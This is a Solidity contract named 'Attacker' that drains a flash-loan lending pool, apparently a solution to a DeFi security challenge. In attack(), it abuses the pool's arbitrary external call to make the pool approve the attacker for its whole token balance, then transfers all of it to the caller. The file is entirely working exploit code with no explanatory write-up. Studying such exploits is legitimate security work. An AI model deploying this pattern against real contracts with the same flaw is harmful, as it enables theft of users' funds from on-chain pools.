// SPDX-Licence-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrustedLenderPool {
	function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
}

contract Attacker {

	ITrustedLenderPool public targetInterface;
	address public targetAddress;
	IERC20 public tokenInterface;
	address public tokenAddress;
	uint256 public TRANSFER_AMOUNT;

	constructor(address _targetAddress, address _tokenAddress) {
		targetInterface = ITrustedLenderPool(_targetAddress);
		targetAddress = _targetAddress;
		tokenInterface = IERC20(_tokenAddress);
		tokenAddress = _tokenAddress;
		TRANSFER_AMOUNT = tokenInterface.balanceOf(targetAddress);
	}

	function attack() public {
		// Encode the data to be called by the target contract
		bytes4 funcSelector = bytes4(keccak256("approve(address,uint256)"));
		bytes memory approveCalldata = abi.encodeWithSelector(funcSelector, address(this), TRANSFER_AMOUNT);
		// Call the `flashLoan` function
		targetInterface.flashLoan(TRANSFER_AMOUNT, targetAddress, tokenAddress, approveCalldata);
		// Extract funds from target
		tokenInterface.transferFrom(targetAddress, msg.sender, TRANSFER_AMOUNT);
	}
}
